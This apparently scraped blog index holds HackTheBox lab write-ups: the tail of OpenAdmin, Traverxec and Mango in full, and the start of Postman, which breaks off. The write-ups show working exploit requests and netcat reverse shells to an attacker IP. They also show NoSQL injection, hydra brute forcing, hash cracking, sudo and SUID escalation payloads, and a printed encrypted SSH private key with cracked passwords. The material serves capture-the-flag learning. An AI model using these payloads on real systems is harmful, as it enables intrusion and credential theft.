kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YOShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Duy8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h//U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZfnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFgS33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4FFnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzhTh5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexaRTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7ZuhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMtqlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adtz0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQeK1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN-----END RSA PRIVATE KEY-----&amp;lt;/pre&amp;gt;&amp;lt;html&amp;gt;&amp;lt;h3&amp;gt;Don&#39;t forget your &quot;ninja&quot; password&amp;lt;/h3&amp;gt;Click here to logout &amp;lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&amp;gt;Session&amp;lt;/html&amp;gt; This because die is not used to terminate the remaining code, after it checks whether username is set, it continues to execute PHP code, instead of just exiting the page. Fix main.php &amp;lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) { header(&quot;Location: /index.php&quot;); die; }; # Open Admin Trusted # OpenAdmin $output = shell_exec(&#39;cat /home/joanna/.ssh/id_rsa&#39;); echo &quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&quot;; ?&amp;gt; &amp;lt;html&amp;gt; &amp;lt;h3&amp;gt;Don&#39;t forget your &quot;ninja&quot; password&amp;lt;/h3&amp;gt; Click here to logout &amp;lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&amp;gt;Session &amp;lt;/html&amp;gt; Now if we were to curl main.php, nothing is displayed. jimmy@openadmin:~$ curl -s localhost:52846/main.php Add a valid cookie to view main.php jimmy@openadmin:~$ curl -s localhost:52846/main.php -H &quot;Cookie: PHPSESSID=27606qebvn7cqbmgua0r1323m1&quot; &amp;lt;pre&amp;gt;-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8 ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE 6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI 9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4 piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/ /U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH 40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb 9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80 X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr 1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2 XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79 yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM +4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN -----END RSA PRIVATE KEY----- &amp;lt;/pre&amp;gt;&amp;lt;html&amp;gt; &amp;lt;h3&amp;gt;Don&#39;t forget your &quot;ninja&quot; password&amp;lt;/h3&amp;gt; Click here to logout &amp;lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&amp;gt;Session &amp;lt;/html&amp;gt; " }, { "title": "HackTheBox - Traverxec", "url": "/posts/Traverxec/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/sudo/gtfo-bin", "date": "2022-09-25 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering that the webserver is running nostromo 1.9.6 which is susceptible to a directory traversal that leads to RCE vulnerability due to insufficient input sanitization, allowing us to obtain a low-privilege/www-data user.For the privilege escalation part, we have to privilege escalate to david and then root. After enumerating the system, nostromo configuration file reveals that homedirs: /home &amp;amp; homedirs_public: /public_www is defined, meaning we have access to the home directory (/&amp;lt;user&amp;gt;/public_www) of users on the system through HTTP via http://traverxec.htb/~&amp;lt;USER&amp;gt;/. Since david is the only user, we know that /home/david/public_www exists, public_www directory contains a backup of david encrypted SSH private key, after cracking it w/ john, we are able to SSH into david by specifying his SSH private key.On user david’s home directory, there is a script that reveals that user david is allowed to execute /usr/bin/journalctl -n5 -unostromo.service as root. journalctl has a GTFOBins entry, allowing us to privilege escalate to root w/ !/bin/sh. Column Details Box Name Traverxec IP 10.10.10.165 Points 20 Difficulty Easy Creator jkr Release Date 16 Nov 2019 ReconTCP/80 (HTTP) FFUF [Status: 200, Size: 15674, Words: 3910, Lines: 401, Duration: 39ms] css [Status: 301, Size: 315, Words: 19, Lines: 14, Duration: 36ms] icons [Status: 301, Size: 315, Words: 19, Lines: 14, Duration: 35ms] img [Status: 301, Size: 315, Words: 19, Lines: 14, Duration: 34ms] index.html [Status: 200, Size: 15674, Words: 3910, Lines: 401, Duration: 34ms] js [Status: 301, Size: 315, Words: 19, Lines: 14, Duration: 35ms] lib [Status: 301, Size: 315, Words: 19, Lines: 14, Duration: 36ms] :: Progress: [4615/4615] :: Job [1/1] :: 54 req/sec :: Duration: [0:04:41] :: Errors: 285 :: Initial FootholdTCP/80 (HTTP) - nostromo/nhttpd 1.9.6 RCE Found out that nostromo 1.9.6/nhttpd 1.9.6 webserver is running Search exploits for nostromo 1.9.6 Exploit Title Path Nostromo - Directory Traversal Remote Command Execution (Metasploit) multiple/remote/47573.rb nostromo 1.9.6 - Remote Code Execution multiple/remote/47837.py nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution linux/remote/35466.sh How does nostromo 1.9.6 - Remote Code Execution - (multiple/remote/47837.py) work? Due to the lack of input sanitization, there is a directory traversal vulnerability in the function http_verify, attackers can include /bin/sh to do remote code execution. Carriage returns (\\r, %0d) is used to bypass the input sanitization of /../ (Directory Traversal), allowing attackers to include /bin/sh to execude code. More Info Try nostromo 1.9.6 - Remote Code Execution - (multiple/remote/47837.py) Run exploit ┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit] └─# python2 47837.py traverxec.htb 80 &#39;id;whoami&#39; HTTP/1.1 200 OK Date: Sat, 24 Sep 2022 17:48:31 GMT Server: nostromo 1.9.6 Connection: close uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data Start netcat listener ┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Invoke reverse shell ┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit] └─# python2 47837.py traverxec.htb 80 &#39;nc 10.10.14.14 4444 -e /bin/bash&#39; TCP/80 (HTTP) - nostromo/nhttpd 1.9.6 RCE (Manual) How does nostromo 1.9.6 - Remote Code Execution work? Due to the insufficient input sanitization, there is a directory traversal vulnerability in the function http_verify, attackers can include /bin/sh to do remote code execution. Carriage returns (\\r, %0d) is used to bypass the input sanitization of /../ (Directory Traversal), allowing attackers to include /bin/sh to execude code. More Info Check if RCE is working POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1 Host: 10.10.10.165 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44 Content-Length: 53 Content-Type: application/x-www-form-urlencoded Content-Length: 53 Connection: close echo echo bash -c &quot;id;whoami&quot; | nc 10.10.14.14 4444 Executed code is not reflected on the webpage, we have to pip | the executed commands into netcat to view it. Start netcat listener ┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.165. Invoke reverse shell POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1 Host: 10.10.10.165 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44 Content-Length: 55 Content-Type: application/x-www-form-urlencoded Content-Length: 55 Connection: close echo echo bash -c &quot;nc 10.10.14.14 4444 -e /bin/bash&quot; Demo - nostromo 1.9.6 RCE TCP/80 (HTTP) - nostromo/nhttpd 1.9.6 RCE (Metasploit) Launch msfconsole Search for nhttpd msf6 &amp;gt; search nhttpd Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nostromo_code_exec msf6 &amp;gt; use 0 [*] Using configured payload cmd/unix/reverse_perl msf6 exploit(multi/http/nostromo_code_exec) &amp;gt; Set OPTIONS msf6 exploit(multi/http/nostromo_code_exec) &amp;gt; set RHOSTS 10.10.10.165 RHOSTS =&amp;gt; 10.10.10.165 msf6 exploit(multi/http/nostromo_code_exec) &amp;gt; set LHOST tun0 LHOST =&amp;gt; 10.10.14.14 Exploit! msf6 exploit(multi/http/nostromo_code_exec) &amp;gt; exploit [*] Started reverse TCP handler on 10.10.14.14:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable) [+] The target appears to be vulnerable. [*] Configuring Automatic (Unix In-Memory) target [*] Sending cmd/unix/reverse_perl command payload [*] Command shell session 2 opened (10.10.14.14:4444 -&amp;gt; 10.10.10.165:33328 ) at 2022-09-25 05:44:11 +0800 shell [*] Trying to find binary &#39;python&#39; on the target machine [*] Found python at /usr/bin/python [*] Using `python` to pop up an interactive shell [*] Trying to find binary &#39;bash&#39; on the target machine [*] Found bash at /usr/bin/bash id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@traverxec:/usr/bin$ Privilege EscalationDavid - Enumeration Find out the location of the root web directory www-data@traverxec:/var/nostromo/conf$ find / 2&amp;gt;/dev/null | grep &quot;portfolio_01.jpg&quot; /var/nostromo/htdocs/img/portfolio/portfolio_01.jpg /var/nostromos View files in /var/nostromos www-data@traverxec:/var/nostromo$ ls -la total 24 drwxr-xr-x 6 root root 4096 Oct 25 2019 . drwxr-xr-x 12 root root 4096 Oct 25 2019 .. drwxr-xr-x 2 root daemon 4096 Oct 27 2019 conf drwxr-xr-x 6 root daemon 4096 Oct 25 2019 htdocs drwxr-xr-x 2 root daemon 4096 Oct 25 2019 icons drwxr-xr-x 2 www-data daemon 4096 Sep 24 12:57 logs conf - contains nostromos configurations View conf/nhttpd.conf www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf # MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www /var/nostromo/conf/.htpasswd Contains basic authentication credentials homedirs: /home When homedirs is defined, the public can access the home directory of users on the system Proceed to http://example.com/~&amp;lt;Name Of User&amp;gt;/ to access the home directory of the specified user homedirs_public: public_www public_www is a directory that exists in the user’s directory When homedirs_public is defined, the public can only access public_www directory, instead of the entire home directory Source Extract Hash in .htpasswd www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd | cut -d &quot;:&quot; -f2 $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ Found .htpasswd w/ linpeas.sh as well ╔══════════╣ Analyzing Htpasswd Files (limit 70) -rw-r--r-- 1 root bin 41 Oct 25 2019 /var/nostromo/conf/.htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ David - Crack Hash Identify the hash alogrithm ┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit] └─# nth --no-banner --file hash $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ Most Likely MD5 Crypt, HC: 500 JtR: md5crypt Cisco-IOS(MD5), HC: 500 JtR: md5crypt FreeBSD MD5, HC: 500 JtR: md5crypt Crack hash w/ hashcat ┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/exploit] └─# hashcat -a 0 -m 500 &#39;$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/&#39; /usr/share/wordlists/rockyou.txt --show $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me It took really long Could not switch to david w/ Nowonly4meDavid - Found Backup SSH Keys View files in /home/david/public_www www-data@traverxec:/home/david/public_www$ find . . ./index.html ./protected-file-area ./protected-file-area/backup-ssh-identity-files.tgz ./protected-file-area/.htaccess www-data@traverxec:/home/david/public_www$ backup-ssh-identity-files.tgz Copy backup-ssh to /tmp &amp;amp; extract it www-data@traverxec:/tmp$ cp backup-ssh-identity-files.tgz /tmp www-data@traverxec:/tmp$ tar -xf backup-ssh-identity-files.tgz -v home/david/.ssh/ home/david/.ssh/authorized_keys home/david/.ssh/id_rsa home/david/.ssh/id_rsa.pub www-data@traverxec:/tmp$ Decrypt encrypted id_rsa ┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/loot] └─# ssh2john id_rsa &amp;gt; john_id_rsa ┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/loot] └─# john --wordlist=/usr/share/wordlists/rockyou.txt john_id_rsa Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status hunter (id_rsa) SSH w/ id_rsa &amp;amp; hunter ┌──(root💀kali)-[~/htb/traverxec/10.10.10.165/loot] └─# sshpass -P &#39;Enter passphrase&#39; -p &#39;hunter&#39; ssh -i id_rsa david@traverxec.htb Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 Last login: Sat Sep 24 16:12:21 2022 from 10.10.14.14 david@traverxec:~$ Root - Enumeration Found a script in david’s home directory david@traverxec:~/bin$ ls -la total 16 drwx------ 2 david david 4096 Sep 24 16:34 . drwx--x--x 5 david david 4096 Sep 24 16:37 .. -r-------- 1 david david 802 Oct 25 2019 server-stats.head -rwx------ 1 david david 363 Oct 25 2019 server-stats.sh View contents of server-stats.sh david@traverxec:~/bin$ cat server-stats.sh #!/bin/bash cat /home/david/bin/server-stats.head echo &quot;Load: `/usr/bin/uptime`&quot; echo &quot; &quot; echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot; echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot; echo &quot; &quot; echo &quot;Last 5 journal log lines:&quot; /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service /usr/bin/journalctl - has a GTFOBins entry Execute server-stats.sh, there is no password prompt, this means that david is able to run /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service as root. david@traverxec:~/bin$ ./server-stats.sh Load: 17:31:48 up 2:35, 1 user, load average: 0.00, 0.00, 0.00 Open nhttpd sockets: 2 Files in the docroot: 117 Last 5 journal log lines: -- Logs begin at Sat 2022-09-24 14:56:34 EDT, end at Sat 2022-09-24 17:31:48 EDT. -- Sep 24 16:50:29 traverxec sudo[13904]: www-data : command not allowed ; TTY=pts/1 ; PWD=/tmp/home/david/.ssh ; USER=root ; COMMAND=list Sep 24 16:50:45 traverxec sudo[13909]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/1 ruser=www-data rhost= user=www-data Sep 24 16:50:48 traverxec sudo[13909]: pam_unix(sudo:auth): conversation failed Sep 24 16:50:48 traverxec sudo[13909]: pam_unix(sudo:auth): auth could not identify password for [www-data] Sep 24 16:50:48 traverxec sudo[13909]: www-data : command not allowed ; TTY=pts/1 ; PWD=/tmp/home/david/.ssh ; USER=root ; COMMAND=list Root - SUDO GTFOBINS How do we exploit journalctl journalctl invokes the default pager, likely to be less. However, -n5 is option is used, meaning only 5 lines will be displayed, since there is sufficient screen space, less will not be invoked. In order to invoke less to spawn a shell, we have to resize the terminal size so that there is insufficent space, causing less to be invoked. Exploit journalctl Make terminal as small as possible Spawn root shell /bin/sh Demo SUDO GTFOBINS journalctl " }, { "title": "HackTheBox - Mango", "url": "/posts/Mango/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/nosql, linux-priv-esc/suid/gtfo-bin", "date": "2022-09-23 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering a subdomain name (staging-order.mango.htb) by viewing the SSL certificate. staging-order.mango.htb is a login page that is susceptible to NoSQL injection, allowing us exfiltrate user mango credentials and SSH w/ it.For the privilege escalation part, we have to privilege escalate to admin then to root. We are able to privilege escalat to admin by specifying the other password exfiltrated from NoSQLi.After enumerating the system for files w/ setuid, jjs is discovered. jjs has a GTFOBins entry, we are able to write our public key into root’s authorized_keys, allowing us to SSH into root. Column Details Box Name Mango IP 10.10.10.162 Points 30 Difficulty Medium Creator MrR3boot Release Date 26 Oct 2019 ReconTCP/443 (HTTPS) NMAP (SSL) | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/organizationalUnitName=None/localityName=None/emailAddress=admin@mango.htb Subdomains: staging-order.mango.htb Initial FootholdTCP/80 (HTTP) - staging-order.mango.htb NoSQLi w/ NoSQLi Tool Found a login page, at http://staging-order.mango.htb/ Tried SQLi, failed ┌──(root💀kali)-[~/htb/mango/10.10.10.162/exploit] └─# sqlmap -r login.req --batch [02:07:20] [CRITICAL] all tested parameters do not appear to be injectable. What is NoSQL Injection A security weakness that affects web applications that uses a NoSQL database, instead they manage data as key-value pairs, documents, or data graphs. Similar to SQL Injection, allows attackers to bypass authentication, exfiltrate sensitive data, tamper w/ the data on the database. Occurs due to the lack/insufficient user input, the same as SQLi. - Source NoSQLi (mongoDB) Tool This tool allows us to enumerate usernames and password of web applications that are vulnerable to NoSQL (mongoDB). Try NoSQLi w/ NoSQLi (mongoDB) Tool Enumerate usernames ┌──(root💀kali)-[~/htb/mango/10.10.10.162/exploit] └─# python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb/index.php -up username -pp password -ep username -op login:login,submit:submit -m POST 2 username(s) found: admin mango Enumerate passwords ┌──(root💀kali)-[~/htb/mango/10.10.10.162/exploit] └─# python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb/index.php -up username -pp password -ep password -op login:login,submit:submit -m POST 2 password(s) found: h3mXK8RhU~f{]f5H t9KcS3&amp;gt;!0B#2 admin:h3mXK8RhU~f{]f5H mango:t9KcS3&amp;gt;!0B#2 Successfully login w/ mango:h3mXK8RhU~f{]f5H TCP/22 (SSH) Bruteforce w/ hydra ┌──(root💀kali)-[~/htb/mango/10.10.10.162/exploit] └─# hydra -L usernames.txt -P password.txt ssh://mango.htb Hydra v9.3 (c) 2022 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-24 03:00:05 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task [DATA] attacking ssh://mango.htb:22/ [22][ssh] host: mango.htb login: mango password: h3mXK8RhU~f{]f5H 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-24 03:00:08 SSH w/ mongo:h3mXK8RhU~f{]f5H ┌──(root💀kali)-[~/htb/mango/10.10.10.162/exploit] └─# sshpass -p &quot;h3mXK8RhU~f{]f5H&quot; ssh mango@mango.htb Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri Sep 23 19:01:25 UTC 2022 System load: 0.12 Processes: 104 Usage of /: 31.6% of 19.56GB Users logged in: 0 Memory usage: 29% IP address for ens33: 10.10.10.162 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 122 packages can be updated. 18 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Mon Sep 30 02:58:45 2019 from 192.168.142.138 mango@mango:~$ id;whoami uid=1000(mango) gid=1000(mango) groups=1000(mango) mango mango@mango:~$ Privilege EscalationAdmin - Su Switch to user admin w/ t9KcS3&amp;gt;!0B#2 mango@mango:/home/admin$ su admin Password: t9KcS3&amp;gt;!0B#2 $ id;whoami uid=4000000000(admin) gid=1001(admin) groups=1001(admin) admin $ Root - Enumeration Find files w/ SUID bit set admin$ find / -perm /4000 -type f -exec ls -lda {} \\; 2&amp;gt;/dev/null | grep admin -rwsr-sr-- 1 root admin 10352 Jul 18 2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs jjs - has a GTFOBins entry Root - SUID GTFOBINS How do we exploit jjs If jjs has  the SUID bit set, it does not drop the elevated privileges. We are able to write our SSH public key into root’s authorized_keys, allowing us to privilege escalate to user root. Exploit jjs - File Write Create payload export EXPLOIT=&#39;var FileWriter = Java.type(&quot;java.io.FileWriter&quot;); var fw=new FileWriter(&quot;/root/.ssh/authorized_keys&quot;); fw.write(&quot;your id_rsa.pub&quot;); fw.close();&#39; Write file $ echo $EXPLOIT |/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs SSH w/ root ┌──(root💀kali)-[~/htb/mango] └─# ssh root@mango.htb Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat Sep 24 13:27:37 UTC 2022 System load: 0.04 Processes: 105 Usage of /: 25.8% of 19.56GB Users logged in: 1 Memory usage: 15% IP address for ens33: 10.10.10.162 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 122 packages can be updated. 18 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Thu Oct 10 08:33:27 2019 Demo - jjs - File Write SSH " }, { "title": "HackTheBox - Postman", "url": "/posts/Postman/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "tcp/80-http/web-app-cms-exploit", "date": "2022-09-22 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a network enumeration, discovering a vulnerable service redis 4.0.9 that is susceptible to a RCE exploit, through the service, we are able to write a SSH public key into user redis’s authorized_keys, allowing us to SSH into user redis.For the privilege escalation part, we have to first privilege escalate to user Matt and then to root. After enumerating the system w/ linpeas.sh, Matt’s encrypted SSH private key is enumerated, after bruteforcing it w/ john, we are able to privilege escalate to Matt w/ su by specifying the passphrase of Matt’s private key.With Matt’s credentials, we are also able to login to MiniServ/Webmin 1.91 on port 10000, where it is susceptible to an authenticated RCE exploit due to vulnerabilities residing in Update Package, allowing us to privilege escalate to root. Column Details Box Name Postman IP 10.10.10.160 Points 20 Difficulty Easy Creator TheCyberGeek Release Date 02 Nov 2019 ReconTCP/80 (HTTP) FFUF 200 GET 91l 253w 3844c http://10.10.10.160/ 403 GET 11l 32w 292c http://10.10.10.160/.html 403 GET 11l 32w 291c http://10.10.10.160/.php 301 GET 9l 28w 310c http://10.10.10.160/css =&amp;gt; http://10.10.10.160/css/ 301 GET 9l 28w 312c http://10.10.10.160/fonts =&amp;gt; http://10.10.10.160/fonts/ 301 GET 9l 28w 313c http://10.10.10.160/images =&amp;gt; http://10.10.10.160/images/ 301 GET 9l 28w 309c http://10.10.10.160/js =&amp;gt; http://10.10.10.160/js/ 403 GET 11l 32w 300c http://10.10.10.160/server-status 301 GET 9l 28w 313c http://10.10.10.160/upload =&amp;gt; http://10.10.10.160/upload/ TCP/10000 (HTTP) NMAP PORT STATE SERVICE REASON VERSION 10000/tcp open http syn-ack ttl 63 MiniServ 1.910 (Webmin httpd) MiniServ 1.910 TCP/6379 (Redis) NMAP PORT STATE SERVICE REASON VERSION 6379/tcp open redis syn-ack ttl 63 Redis key-value store 4.0.9 (64 bits) |_redis-info: ERROR: Script execution failed (use -d to debug) Redis key-value store 4.0.9 Initial FootholdTCP/10000 (HTTP) - Webmin/MiniServ 1.910 Login Found Webmin/MiniServ login page Search exploits for Webmin 1.910 Exploit Title Path Webmin 1.910 - ‘Package Updates’ Remote Command Execution (Metasploit) linux/remote/46984.rb Webmin 1.910 - Remote Code Execution Using Python Script https://github.com/roughiz/Webmin-1.910-Exploit-Script Tried Shellshock, failed Lets move on.TCP/6379 (Redis key-value store 4.0.9) - RCE via SSH public key write Search exploits for Redis key-value store 